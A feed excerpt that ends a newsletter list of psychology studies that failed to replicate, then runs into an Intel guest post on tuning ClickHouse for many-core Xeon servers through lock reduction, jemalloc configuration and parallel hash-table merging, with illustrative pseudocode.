<li><strong>Source</strong>: A <a href="https://climr.org/about/" rel="nofollow noopener noreferrer" target="_blank">collaboration</a> between 73 labs around the world is vetting this theory right now because of many doubts about its validity.</li>
</ul>
<h3>Ovulation &amp; Mate Preferences Effect</h3>
<ul>
<li><strong>Claimed result:</strong> Women are more attracted to hot guys during high-fertility days of their cycles.</li>
<li><strong>Representative paper:</strong> <a href="https://doi.org/10.1037/a0035438" rel="nofollow noopener noreferrer" target="_blank">Gildersleeve, Haselton, &amp; Fales (2014)</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://publications.goettingen-research-online.de/bitstream/2/77327/1/10.1177_0956797619882022.pdf" rel="nofollow noopener noreferrer" target="_blank">Stern, Gerlach, &amp; Penke (2020)</a></li>
</ul>
<h3>Marshmallow Test &amp; Long-Term Success Effect</h3>
<ul>
<li><strong>Claimed result:</strong> Children's ability to resist eating a marshmallow when left alone in a room at age 4-5 strongly predicts adolescent achievement, with those who waited longer showing better life outcomes.</li>
<li><strong>Representative paper:</strong> <a href="https://doi.org/10.1037/0012-1649.26.6.978" rel="nofollow noopener noreferrer" target="_blank">Shoda, Mischel, &amp; Peake (1990)</a></li>
<li><strong>Replication status:</strong> <em>did not replicate significantly</em></li>
<li><strong>Source:</strong> <a href="https://doi.org/10.1177/0956797618761661" rel="nofollow noopener noreferrer" target="_blank">Watts, Duncan, &amp; Quan (2018)</a></li>
</ul>
<h3>Stereotype Threat (Women's Math Performance) Effect</h3>
<ul>
<li><strong>Claimed result:</strong> Women risk being judged by the negative stereotype that women have weaker math ability, and this apprehension disrupts their math performance on difficult tests.</li>
<li><strong>Representative paper:</strong> <a href="https://www.sciencedirect.com/science/article/abs/pii/S0022103198913737" rel="nofollow noopener noreferrer" target="_blank">Spencer, Steele, &amp; Quinn (1999)</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://doi.org/10.1016/j.jsp.2014.10.002" rel="nofollow noopener noreferrer" target="_blank">Flore &amp; Wicherts (2015)</a></li>
</ul>
<h3>Smile to Feel Better Effect</h3>
<ul>
<li><strong>Claimed result</strong>: Holding a pen in your teeth (forcing a smile-like expression) makes you rate cartoons as funnier compared to holding a pen with your lips (preventing smiling). More broadly, facial expressions can influence emotional experiences: "fake it till you make it."</li>
<li><strong>Representative paper</strong>: <a href="https://psycnet.apa.org/record/1988-25514-001" rel="nofollow noopener noreferrer" target="_blank">Strack, Martin, &amp; Stepper (1988)</a></li>
<li><strong>Replication status</strong>: <em>did not replicate</em></li>
<li><strong>Source</strong>: <a href="https://journals.sagepub.com/doi/full/10.1177/1745691616674458" rel="nofollow noopener noreferrer" target="_blank">Wagenmakers et (54!) al. (2016)</a></li>
</ul>
<h3>Objective Measurement of Biases</h3>
<ul>
<li><strong>Claimed result</strong>: You can predict if someone is racist by how quickly they answer certain trick questions.</li>
<li><strong>Representative paper</strong>: <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2F0022-3514.74.6.1464" rel="nofollow noopener noreferrer" target="_blank">Greenwald, McGhee, &amp; Schwartz (1998)</a></li>
<li><strong>Replication status</strong>: <em>mixed evidence with small effects</em></li>
<li><strong>Source</strong>: <a href="https://pubmed.ncbi.nlm.nih.gov/23773046/" rel="nofollow noopener noreferrer" target="_blank">Oswald et al. (2013)</a> shows that the prediction power is small at best.</li>
</ul>
<h3>Mozart Effect</h3>
<ul>
<li><strong>Claimed result</strong>: Listening to Mozart temporarily makes you smarter.</li>
<li><strong>Representative paper</strong>: <a href="https://www.nature.com/articles/365611a0" rel="nofollow noopener noreferrer" target="_blank">Rauscher, Shaw, &amp; Ky (1993)</a></li>
<li><strong>Replication status</strong>: <em>did not replicate</em></li>
<li><strong>Source</strong>: <a href="https://www.sciencedirect.com/science/article/abs/pii/S0160289610000267" rel="nofollow noopener noreferrer" target="_blank">Pietschnig, Voracek, &amp; Formann (2010)</a> (What a title!)</li>
</ul>
<h3>Growth Mindset Interventions</h3>
<ul>
<li><strong>Claimed result:</strong> Teaching students that intelligence is malleable (not fixed) dramatically improves academic performance.</li>
<li><strong>Representative paper:</strong> <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2F0033-295X.95.2.256" rel="nofollow noopener noreferrer" target="_blank">Dweck, &amp; Leggett (1988)</a></li>
<li><strong>Replication status:</strong> <em>mixed results</em> - many failed replications but also some successful replications</li>
<li><strong>Failed replication source:</strong> <a href="https://pubmed.ncbi.nlm.nih.gov/31464486/" rel="nofollow noopener noreferrer" target="_blank">Li &amp; Bates 2019</a></li>
<li><strong>Notable successful replication:</strong> <a href="https://www.nature.com/articles/s41586-019-1466-y" rel="nofollow noopener noreferrer" target="_blank">Yeager et al. 2019 in Nature</a></li>
</ul>
<h3>Bilinguals Are Smarter</h3>
<ul>
<li><strong>Claimed result:</strong> Being bilingual provides substantial cognitive advantages in attention, task-switching, and executive control.</li>
<li><strong>Representative paper:</strong> <a href="https://www.cell.com/trends/cognitive-sciences/abstract/S1364-6613(12)00056-3" rel="nofollow noopener noreferrer" target="_blank">Bialystok, Craik, &amp; Luk (2012)</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://pubmed.ncbi.nlm.nih.gov/29494195/" rel="nofollow noopener noreferrer" target="_blank">Lehtonen et al. 2018</a></li>
</ul>
<p>Did I miss any famous debunked studies? Let me know by replying to this newsletter, and I'll add it to the list. ●</p>
<div><p>Cover image:</p><p><em>Photo by Rebecca Freeman, Unsplash</em></p></div></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Optimizing ClickHouse for Intel's 280 core processors (191 pts)]]></title>
            <link>https://clickhouse.com/blog/optimizing-clickhouse-intel-high-core-count-cpu</link>
            <guid>45279792</guid>
            <pubDate>Wed, 17 Sep 2025 18:46:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://clickhouse.com/blog/optimizing-clickhouse-intel-high-core-count-cpu">https://clickhouse.com/blog/optimizing-clickhouse-intel-high-core-count-cpu</a>, See on <a href="https://news.ycombinator.com/item?id=45279792">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><div><blockquote>
<p>This is a guest post from Jiebin Sun, Zhiguo Zhou, Wangyang Guo and Tianyou Li, performance optimization engineers at Intel Shanghai.</p>
</blockquote>
<p>Intel's latest processor generations are pushing the number of cores in a server to unprecedented levels - from 128 P-cores per socket in Granite Rapids to 288 E-cores per socket in Sierra Forest, with future roadmaps targeting 200+ cores per socket. These numbers multiply on multi-socket systems, such servers may consist of 400 and more cores. The paradigm of "more, not faster cores" is driven by physical limitations. Since the end of Dennard scaling in the mid-2000s, power density concerns made it increasingly difficult to push single-thread performance further.</p>
<p>For analytical databases like ClickHouse, ultra-high core counts represent a huge opportunity and a complex challenge at the same time. While more cores theoretically mean more power to process tasks in parallel, most databases struggle to utilize the available hardware fully. Bottlenecks for parallel processing  like lock contention, cache coherence, non-uniform memory access (NUMA), memory bandwidth, and coordination overhead become significantly worse as the core count increases.</p>

<p>Over the past three years, I dedicated a part of my professional life to understand and optimize ClickHouse's scalability on Intel Xeon ultra-high core count processors. My work focused on using various profiling and analysis tools - including perf, emon, and Intel VTune - to analyze all 43 ClickBench queries on ultra-high core count servers systematically, identifying bottlenecks, and optimizing the ClickHouse accordingly.</p>
<p>The results have been exciting: individual optimizations routinely deliver speedups of multiple times for individual queries, in some cases up to 10x. The geometric mean of all 43 ClickBench queries consistently improved between 2% and 10% per optimization. The results demonstrate that ClickHouse can be made scale very well on ultra-high core count systems.</p>

<p>Beyond single-thread performance, several key challenges must be addressed to optimize performance in ultra-high core count systems.</p>
<ol>
<li><strong>Cache coherence overhead</strong>: Bouncing cache lines costs CPU cycles.</li>
<li><strong>Lock contention</strong>: Amdahl's Law becomes brutal for serialized code sections as little as 1% of the overall code.</li>
<li><strong>Memory bandwidth</strong>: Utilizing the memory bandwidth effectively is a persistent challenge for data-intensive systems. Proper memory reuse, management and caching becomes critical.</li>
<li><strong>Thread coordination</strong>: The cost of synchronizing threads grows super-linearly with the number of threads.</li>
<li><strong>NUMA effects</strong>: The memory latency and bandwidth on multi-socket systems differs for local or remote memory.</li>
</ol>
<p>This blog post summarizes our optimizations for ClickHouse on ultra-high core count servers. All of them were merged into the main codeline and they now help to speed up queries in ClickHouse deployments around the globe.</p>
<p><strong>Hardware setup</strong>: Our work was conducted on Intel's latest generation platforms, including 2 x 80 vCPUs Ice Lake (ICX), 2 x 128 vCPUs Sapphire Rapids (SPR), 1 x 288 vCPUs Sierra Forest (SRF), and 2 x 240 vCPUs Granite Rapids (GNR). SMT (Hyper-threading) was enabled, except on SRF which doesn't support SMT, and high-memory-bandwidth configurations.</p>
<p><strong>Software setup</strong>: We used perf, Intel VTune, pipeline visualization, and other custom profiling infrastructure.</p>

<p>Through a systematic analysis of ClickHouse's performance on ultra-high core count systems, I identified five areas with a high potential for optimization. Each area addresses a different aspect of scalability, and together they form a comprehensive approach to unlocking the full potential of ultra-high core count systems.</p>
<p>My journey began with the most fundamental challenge: lock contention.</p>
<h2 id="bottleneck-1-lock-contention"><strong>Bottleneck 1: Lock contention</strong> </h2>
<p>According to queue theory, if N threads compete for the same lock, the cycles grows quadratically (N^2). For example, if we go from 8 to 80 cores, lock wait times increase by (80/8)² = 100x. Furthermore, cache coherence traffic for the mutex itself grows linearly with the core count, and the overhead for context switching compounds the problem. In such settings, every mutex becomes a potential scalability obstacle, and seemingly innocent synchronization patterns can bring entire systems to their knee.</p>
<p>The key insight is that lock contention isn't just about removing locks - it's about rethinking more fundamentally how threads coordinate and share state. This requires a multi-pronged approach: reducing the duration of critical sections, replacing exclusive locks (mutexes) with more granular synchronization primitives, and in some cases, eliminating shared state entirely.</p>

<p>After resolving jemalloc page faults (an optimization detailed below), a new hotspot appeared in <code>native_queued_spin_lock_slowpath</code> which consumed 76% of the CPU time. This function was called from <code>QueryConditionCache::write</code> on 2×240 vCPU systems.</p>
<p><strong>What is the query condition cache?</strong></p>
<p><a href="https://clickhouse.com/docs/operations/query-condition-cache">ClickHouse’s query condition cache</a> stores the results of WHERE filters, enabling the database to skip irrelevant data. In each SELECT query, multiple threads check if cache entries must be updated based on different criteria:</p>
<ul>
<li>the hash of the filter condition (as cache key)</li>
<li>the read mark ranges</li>
<li>whether the currently read part has a final mark</li>
</ul>
<p>The query condition cache is read-heavy, i.e. there are far more reads than writes, but the original implementation used exclusive locking for all operations.</p>
<p><strong>Reducing critical paths in read-heavy workloads</strong></p>
<p>This optimization demonstrates the importance of reducing the time spent holding locks, especially write locks in read-heavy code.</p>
<p>With 240 threads within a single query, the original code created a perfect storm:</p>
<ol>
<li><strong>Unnecessary write locks</strong>: All threads acquired exclusive locks, even when they only read cache entries.</li>
<li><strong>Long critical sections</strong>: Expensive updates of cache entries were performed inside exclusive locks.</li>
<li><strong>Redundant work</strong>: Multiple threads updated the same cache entries potentially multiple times.</li>
</ol>
<p>Our optimization uses <a href="https://en.wikipedia.org/wiki/Double-checked_locking">double-checked locking</a> with atomic operations to resolve these bottlenecks:</p>
<ol>
<li>The code now first checks with atomic reads (no locking), respectively under a shared lock if an update is needed at all (fast path).</li>
<li>Next, the code checks immediately after acquiring an exclusive lock (slow path) if an update is actually required - another thread may have performed the same update in the meantime.</li>
</ol>
<p><strong>Implementation</strong></p>
<p>Based on <a href="https://github.com/ClickHouse/ClickHouse/pull/80247/files">PR #80247</a>, the optimization introduces a fast path which checks if an update is needed before acquiring the expensive write lock.</p>
<pre><code><span>/// Original code</span>
<span>void</span> <span>updateCache</span><span>(mark_ranges, has_final_mark)</span>
{
    acquire_exclusive_lock(cache_mutex);  <span>/// 240 threads wait here!</span>

    <span>/// Always update marks, even if already in desired state</span>
    <span>for</span> (<span>const</span> <span>auto</span> &amp; range : mark_ranges)
        set_marks_to_false(range.begin, range.end);

    <span>if</span> (has_final_mark):
        set_final_mark_to_false();

    release_lock(cache_mutex);
}
</code></pre>
<pre><code>
<span>/// Optimized code</span>
<span>void</span> <span>updateCache</span><span>(mark_ranges, has_final_mark)</span>
{
    <span>/// Fast path: Check if update is needed with a cheap shared lock</span>
    acquire_shared_lock(cache_mutex);  <span>/// Multiple threads can read simultaneously</span>

    need_update = <span>false</span>;
    <span>for</span> (<span>const</span> <span>auto</span> &amp; range : mark_ranges)
    {
        <span>if</span> (any_marks_are_true(range.begin, range.end))
        {
            need_update = <span>true</span>;
            <span>break</span>;
        }
    }

    <span>if</span> (has_final_mark &amp;&amp; final_mark_is_true())
        need_update = <span>true</span>;

    release_shared_lock(cache_mutex);

    <span>if</span> (!need_update)
        <span>return</span>;  <span>/// Early out - no expensive lock needed!</span>

    <span>/// Slow path: Actually need to update, acquire exclusive lock</span>
    acquire_exclusive_lock(cache_mutex);

    <span>/// Double-check: verify update is still needed after acquiring lock</span>
    need_update = <span>false</span>;
    <span>for</span> (<span>const</span> <span>auto</span> &amp; range : mark_ranges)
    {
        <span>if</span> (any_marks_are_true(range.begin, range.end))
        {
            need_update = <span>true</span>;
            <span>break</span>;
        }
    }

    <span>if</span> (has_final_mark &amp;&amp; final_mark_is_true())
        need_update = <span>true</span>;

    <span>if</span> (need_update)
    {
        <span>// Perform the actual updates only if still needed</span>
        <span>for</span> (<span>const</span> <span>auto</span> &amp; range : mark_ranges)
            set_marks_to_false(range.begin, range.end);

        <span>if</span> (has_final_mark)
            set_final_mark_to_false();
    }

    release_lock(cache_mutex);
}
</code></pre>
<p><strong>Performance impact</strong></p>
<p>The optimized code delivered impressive performance improvements:</p>
<ul>
<li>CPU cycles spend for <code>native_queued_spin_lock_slowpath</code> reduced from 76% to 1%</li>
<li>The QPS of ClickBench queries Q10 and Q11 improved by 85% and 89%</li>
<li>The geometric mean of all ClickBench queries improved by 8.1%</li>
</ul>

<p>ClickHouse's query profiler was frequently creating and deleting a global timer_id variable, causing lock contention during query profiling.</p>
<p><strong>Query profiler timer usage</strong></p>
<p>ClickHouse's query profiler uses POSIX timers to sample thread stacks in periodic intervals for performance analysis. The original implementation:</p>
<ul>
<li>created and deleted timer_id frequently during profiling, and</li>
<li>required global synchronization for all operations that read or write the timer.</li>
</ul>
<p>Usage of shared data structures that needed protection with locks caused significant overhead.</p>
<p><strong>Eliminating global state with thread-local storage</strong></p>
<p>Here, we eliminated lock contention by thread-local storage, removing the need for shared state. Now, each thread has its own timer_id. This avoids shared state and the overhead of thread synchronization. To update a timer, it is no longer required to acquire locks.</p>
<p><strong>Technical solution</strong></p>
<pre><code><span>/// Original code</span>
<span><span>class</span> <span>QueryProfiler</span>
{</span>
    <span>static</span> global_mutex timer_management_lock

    <span>void</span> <span>startProfiling</span><span>()</span>
    {
        timer_id = create_new_timer();  <span>/// Expensive system call</span>

        acquire_exclusive_lock(timer_management_lock);  <span>/// Global lock!</span>
        update_shared_timer_state(timer_id);  <span>/// Modify shared state</span>
        release_lock(timer_management_lock);
    }

    <span>void</span> <span>stopProfiling</span><span>()</span>
    {
        acquire_exclusive_lock(timer_management_lock);
        cleanup_shared_timer_state(timer_id);
        release_lock(timer_management_lock);

        delete_timer(timer_id);
    }
}
</code></pre>
<pre><code><span>/// Optimized code</span>
<span><span>class</span> <span>QueryProfiler</span>
{</span>
    <span>static</span> <span>thread_local</span> timer_id per_thread_timer;
    <span>static</span> <span>thread_local</span> boolean timer_initialized;

    <span>void</span> <span>startProfiling</span><span>()</span>
    {
        <span>if</span> (!timer_initialized)
        {
            per_thread_timer = create_new_timer();  <span>/// Once per thread</span>
            timer_initialized = <span>true</span>;
        }

        <span>/// Reuse existing timer - no locks, no system calls!</span>
        enable_timer(per_thread_timer);
    }

    <span>void</span> <span>stopProfiling</span><span>()</span>
    {
        <span>/// Just disable timer - no deletion, no locks!</span>
        disable_timer(per_thread_timer);
    }
}
</code></pre>
<p><strong>Performance impact</strong></p>
<p>The new implementation has the following advantages:</p>
<ul>
<li>It eliminated timer-related lock contention hotspots from profiling traces</li>
<li>It reduced timer create/delete system calls through reuse</li>
<li>It makes profiling on ultra-high core count servers more scalable.</li>
</ul>
<p>Thread-local storage can eliminate lock contention by removing the need for shared state. Global synchronization becomes unnecessary if threads maintain their own state.</p>

<p>Memory optimization on ultra-high core count systems differs a lot from single-threaded memory management. Memory allocators themselves become contention points, memory bandwidth is divided across more cores, and allocation patterns that work fine on small systems can create cascading performance problems at scale. It is crucial to be mindful of how much memory is allocated and how memory is used.</p>
<p>This class of optimizations involves the allocator’s behavior, reducing pressure on memory bandwidth, and sometimes completely rethinking algorithms to eliminate memory-intensive operations altogether.</p>

<p>This optimization is motivated by high page fault rates and excessive resident memory usage which we observed for certain aggregation queries on ultra-high core count systems.</p>
<p><strong>Understanding two-level hash tables in ClickHouse</strong></p>
<p>Aggregation in ClickHouse uses different hash tables, depending on the data type, data distribution and data size. Large aggregation states are maintained in ephemeral hash tables.</p>
<ul>
<li>The <strong>1st level</strong> consists of 256 static buckets, each pointing to a 2nd level hash table.</li>
<li><strong>2nd level</strong> hash tables grow independently of each other.</li>
</ul>
<p><strong>Memory reuse for two-level hash tables</strong></p>
<p>At the end of an aggregation query, all hash tables used by the query are deallocated. In particular, the 256 sub-hash tables are deallocated and their memory is merged into larger free memory blocks.</p>
<p>jemalloc (as ClickHouse’s memory allocator) unfortunately prevented the reuse of merged memory blocks for future smaller allocations. This is because by default, only memory from blocks up to 64x larger than the requested size can be reused. This issue in jemalloc is very subtle but critical on ultra-high core count systems.</p>
<p>Based on <a href="https://github.com/jemalloc/jemalloc/pull/2842">jemalloc issue #2842</a>, we noticed a fundamental problem with jemalloc’s memory reuse for the irregularly-sized allocations typical in two-level hash tables:</p>
<ol>
<li><strong>Extent management issue</strong>: When large allocations are freed, jemalloc fails to efficiently track and reuse these memory extents.</li>
<li><strong>Size class fragmentation</strong>: Memory gets trapped in size classes that don't match future allocation patterns.</li>
<li><strong>Metadata overhead</strong>: Excessive metadata structures prevent efficient memory coalescing.</li>
<li><strong>Page fault amplification</strong>: New allocations trigger page faults instead of reusing existing committed pages.</li>
</ol>
<p>We identified jemalloc's <code>lg_extent_max_active_fit</code> parameter as the root cause - it was too restrictive for ClickHouse's allocation patterns.</p>
<p>We contributed the fix to <a href="https://github.com/jemalloc/jemalloc/pull/2842">jemalloc PR #2842</a>, but jemalloc didn’t have new stable releases for an extended period. Fortunately, we could resolve this issue through jemalloc's configuration parameters at compilation time.</p>
<p>Based on ClickHouse <a href="https://github.com/ClickHouse/ClickHouse/pull/80245">PR #80245</a>, the fix involved tuning jemalloc's configuration parameters:</p>
<pre><code><span>/// Original jemalloc configuration</span>
JEMALLOC_CONFIG_MALLOC_CONF = <span>"oversize_threshold:0,muzzy_decay_ms:0,dirty_decay_ms:5000"</span>
<span>/// lg_extent_max_active_fit defaults to 6, meaning memory can be reused from extents up to 64x larger than the requested allocation size</span>
</code></pre>
<pre><code><span>/// Optimized jemalloc configuration</span>
JEMALLOC_CONFIG_MALLOC_CONF = <span>"oversize_threshold:0,muzzy_decay_ms:0,dirty_decay_ms:5000,lg_extent_max_active_fit:8"</span>
<span>/// lg_extent_max_active_fit is set to 8.</span>
<span>/// This allows memory reuse from extents up to 256x larger</span>
<span>/// than the requested allocation size (2^8 = 256x vs default 2^6 = 64x).</span>
<span>/// The 256x limit matches ClickHouse's two-level hash table structure (256 buckets).</span>
<span>/// This enables efficient reuse of merged hash table memory blocks.</span>
</code></pre>
<p><strong>Performance impact</strong></p>
<p>The optimization improved</p>
<ul>
<li>the performance of ClickBench query Q35 by 96.1%,</li>
<li>memory usage (VmRSS, resident memory) and page faults reduced for the same query went down by 45.4% and 71%, respectively.</li>
</ul>
<p>The behavior of the memory allocator can have a dramatic impact on ultra-high core count systems.</p>

<p>ClickBench query Q29 was memory-bound and bottlenecked in excessive memory accesses caused by redundant computations of the form <code>sum(column + literal)</code>.</p>
<p><strong>Understanding the memory bottleneck</strong></p>
<p>ClickBench query Q29 contains multiple sum expressions with literals:</p>
<pre><code><span>SELECT</span> <span>SUM</span>(ResolutionWidth), <span>SUM</span>(ResolutionWidth <span>+</span> <span>1</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>2</span>), 
       <span>SUM</span>(ResolutionWidth <span>+</span> <span>3</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>4</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>5</span>), 
       <span>SUM</span>(ResolutionWidth <span>+</span> <span>6</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>7</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>8</span>), 
       <span>SUM</span>(ResolutionWidth <span>+</span> <span>9</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>10</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>11</span>), 
       <span>SUM</span>(ResolutionWidth <span>+</span> <span>12</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>13</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>14</span>), 
       <span>SUM</span>(ResolutionWidth <span>+</span> <span>15</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>16</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>17</span>), 
       <span>SUM</span>(ResolutionWidth <span>+</span> <span>18</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>19</span>), <span>SUM</span>(ResolutionWidth <span>+</span> <span>20</span>),
       <span>-- ... continues up to SUM(ResolutionWidth + 89)</span>
<span>FROM</span> hits;
</code></pre>
<p>The original query execution</p>
<ol>
<li><strong>Loaded column</strong> “ResolutionWidth” from storage once,</li>
<li><strong>Compute expressions</strong> - 90 times, creating 90 temporary columns (one per expression),</li>
<li><strong>Sum values</strong> performing 90 separate aggregation operations on each computed column.</li>
</ol>
<p>Creating 90 temporary columns and running 90 redundant aggregations obviously created massive memory pressure.</p>
<p><strong>Frontend query optimization for memory efficiency</strong></p>
<p>This optimization demonstrates how better optimizer rules can reduce memory pressure by eliminating redundant computations. The key insight is that many analytical queries contain patterns that can be algebraically simplified.</p>
<p>The optimization recognizes that <code>sum(column + literal)</code> can be rewritten to <code>sum(column) + count(column) * literal</code>.</p>
<p><strong>Performance impact</strong></p>
<ul>
<li>ClickBench query Q29 sped up by 11.5x on a 2×80 vCPU system.</li>
<li>The geometric mean of all ClickBench queries saw a 5.3% improvement overall.</li>
</ul>
<p>More intelligent query plans can be more effective than optimizing execution itself. Avoiding work is better than doing work efficiently.</p>

<p>Fast aggregation is a core promise of any analytical database. From a database perspective, aggregating data in parallel threads is only one part of the equation. It is equally important to merge the local results in parallel.</p>
<p>ClickHouse's aggregation operator has two phases: In the first phase, each thread processes its portion of the data in parallel, creating a local and partial result. In the second phase, all partial results must be merged. If the merge phase is not properly parallelized, it becomes a bottleneck. More threads can actually make this issue worse by creating more partial results to merge.</p>
<p>Solving this issue requires careful algorithm design, smart data structure choices, and a deep understanding how hash tables behave under different load patterns. The goal is to eliminate the serial merge phase and enable linear scaling even for the most complex aggregation queries.</p>

<p>ClickBench query Q5 showed a severe performance degradation as the core count increased from 80 to 112 threads. Our pipeline analysis revealed serial processing in the hash table conversion.</p>
<p><strong>Understanding hash tables in ClickHouse</strong></p>
<p>ClickHouse uses two types of hash tables for hash aggregation:</p>
<ol>
<li><strong>Single-level hash tables</strong>: This is a flat hash table that is suitable (= faster) for smaller datasets.</li>
<li><strong>Two-level hash tables</strong>: This is a hierarchical hash table with 256 buckets. Two-level hash tables are more amendable to large datasets.</li>
</ol>
<p>The database chooses the right hash table type based on the size of the processed data: Once a single-level hash table reaches a certain threshold during aggregation, it is automatically converted to a two-level hash table. The code to merge hash tables of different types was serialized.</p>
<p><strong>The serial bottleneck</strong></p>
<p>When merging hash tables from different threads,</p>
<ul>
<li><strong>single-level hash tables</strong> were serially merged in a pair-wise manner, e.g. ht1 / ht2 → result, then result / ht3, etc.</li>
<li><strong>two-level hash tables</strong> are merged one-by-one as well but the merge is parallelized across buckets.</li>
</ul>
<p>In the case of mixed single/two-level hash tables, the single-level hash tables had to be converted to two-level hash tables first (this was a serial process). Once the was done, the resulting two-level hash tables could be merged in parallel.</p>
<p>With Q5, increasing the number of threads from 80 to 112 meant that each thread processes less data. With 80 threads, all hash tables were two-level. With 112 threads, the aggregation ended up with the mixed scenario: some hash tables remained single-level while others became two-level. This caused serialization - all single-level hash tables had to be converted to two-level before parallel merging could take place.</p>
<p>To diagnose the issue, pipeline visualization was a crucial tool. The telltale sign was that the merge phase duration increased with thread count - this is the opposite of what should happen.</p>
<p><img src="https://clickhouse.com/uploads/intel_img_1_1481af3982.png" alt="intel_img_1.png" loading="lazy"></p>
<p><em>Performance degradation with increased core count</em></p>
<p><img src="https://clickhouse.com/uploads/intel_img_2_d019431938.png" alt="intel_img_2.png" loading="lazy"></p>
<p><em>Pipeline visualization (max_threads=80) - the merge phase is reasonable</em></p><p><img src="https://clickhouse.com/uploads/intel_img_3_b28b847281.png" alt="intel_img_3.png" loading="lazy"></p>
<p><em>Pipeline visualization (max_threads=112) - the merge phase takes 3.2x longer</em></p><p>Our optimization parallelizes the conversion phase: instead of converting all single-level hash tables to two-level hash tables one by one (serially), we now convert them in parallel. As each hash table can be converted independently, this eliminates the serial bottleneck.</p>
<pre><code><span>/// Original code</span>
<span>void</span> <span>mergeHashTable</span><span>(left_table, right_table)</span>
{
    <span>if</span> (left_table.is_single_level() &amp;&amp; right_table.is_two_level())    
        left_table.convert_to_two_level();  <span>/// Serial conversion blocks threads</span>

    <span>/// Now merge</span>
    merge_sets(left_table, right_table);
}
</code></pre>
<pre><code><span>/// Optimized code</span>
<span>void</span> <span>mergeHashTableParallel</span><span>(all_tables)</span>
{
    <span>/// Phase 1: Parallel conversion</span>
    parallel_tasks = [];
    <span>for</span> (<span>const</span> <span>auto</span> &amp; table : all_tables)
    {
        <span>if</span> (table.is_single_level())
        {
            <span>/// Parallel conversion!</span>
            task = create_parallel_task(table.convert_to_two_level());
            parallel_tasks.add(task);
        }
    }

    <span>/// Wait for all conversions to complete</span>
    wait_for_all_tasks(parallel_tasks);

    <span>/// Phase 2: Now all sets are two-level, merge efficiently.</span>
    <span>for</span> (<span>const</span> <span>auto</span> &amp; <span>pair</span> : all_tables)
        merge_sets(<span>pair</span>.left_table, <span>pair</span>.right_table);
}
</code></pre>
<p><strong>Performance impact</strong></p>
<p>The performance did not improve only for Q5 - the optimization enabled linear scaling for any aggregation-heavy query on ultra-high core count systems.</p>
<p><img src="https://clickhouse.com/uploads/intel_img_4_c4f403312b.png" alt="intel_img_4.png" loading="lazy"></p>
<p><em>Performance improvement after parallel conversion - Q5 achieves 264% improvement</em></p>
<ul>
<li>ClickBench query Q5 improved by a 264% on a 2×112 vCPU system,</li>
<li>24 queries achieved &gt;5% improvement,</li>
<li>the overall geometric mean improved by 7.4%</li>
</ul>
<p>The optimization demonstrates that scalability isn't just about making things more parallel - it's about eliminating serial sections that grow with parallelism. Sometimes you need to restructure algorithms on a more deep level, not just add more threads.</p>

<p>We noticed that the performance was also subpar when all hash tables were single-level.</p>
<p><strong>Extending parallel merge to single-level cases</strong></p>
<p>Building on <a href="https://github.com/ClickHouse/ClickHouse/pull/50748">PR #50748</a>, this optimization recognizes that the benefits of parallel merging are not limited to mixed hash tables. Even when all hash tables are single-level, parallel merging can improve performance if the total data size is large enough.</p>
<p>The challenge was to determine when single-level hash tables should be merged in parallel parallel:</p>
<ul>
<li>If datasets are too small, parallelization introduces extra overhead.</li>
<li>If datasets are too large, parallelization may not be beneficial enough.</li>
</ul>
<p>Based on the implementation in <a href="https://github.com/ClickHouse/ClickHouse/pull/52973/files">PR #52973</a>, the optimization added parallel merges to all single-level cases:</p>
<pre><code><span>/// Before: Only parallelize mixed-level merges</span>
<span>void</span> <span>parallelizeMergePrepare</span><span>(hash_tables)</span>
{
    single_level_count = <span>0</span>;

    <span>for</span> (<span>const</span> <span>auto</span> &amp; hash_table : hash_tables)
        <span>if</span> hash_table.is_single_level():
            single_level_count++;

    <span>/// Only convert if mixed levels (some single, some two-level)</span>
    <span>if</span> single_level_count &gt; <span>0</span> and single_level_count &lt; hash_tables.size():
        convert_to_two_level_parallel(hash_tables);
}
</code></pre>
<pre><code><span>/// Optimized code</span>
<span>void</span> <span>parallelizeMergePrepare</span><span>(hash_tables)</span>:
{
    single_level_count = <span>0</span>;
    all_single_hash_size = <span>0</span>;

    <span>for</span> (<span>const</span> <span>auto</span> &amp; hash_table : hash_tables)
        <span>if</span> (hash_table.is_single_level())
            single_level_count++

    <span>/// Calculate total size if all hash tables are single-level</span>
    <span>if</span> (single_level_count == hash_tables.size())
        <span>for</span> (<span>const</span> <span>auto</span> &amp; hash_table : hash_tables)
            all_single_hash_size += hash_table.size();

    <span>/// Convert if mixed levels OR if all single-level with average size &gt; THRESHOLD</span>
    <span>if</span> (single_level_count &gt; <span>0</span> and single_level_count &lt; hash_tables.size())
        ||
       (all_single_hash_size / hash_tables.size() &gt; THRESHOLD)
        convert_to_two_level_parallel(hash_tables);
}
</code></pre>
<p><strong>Performance impact</strong></p>
<ul>
<li>Performance for single-level merge scenarios improved by 235%</li>
<li>The optimal threshold was determined through systematic testing</li>
<li>There were no regressions on small datasets</li>
</ul>

<p>GROUP BY operations with large hash tables were merged serially.</p>
<p><strong>Extending parallelization to keyed aggregations</strong></p>
<p>The previous two optimizations (3.1 and 3.2) addressed merges without key - simple hash table operations like <code>COUNT(DISTINCT)</code>. We applied the same optimization to merges with key where hash tables contain both keys and aggregated values that must be combined, e.g. general <code>GROUP BY</code> semantics.</p>
<p><strong>Performance Impact</strong>:</p>
<ul>
<li>ClickBench query Q8 improved by 10.3%, Q9 by 7.6%</li>
<li>There were no regressions in other queries</li>
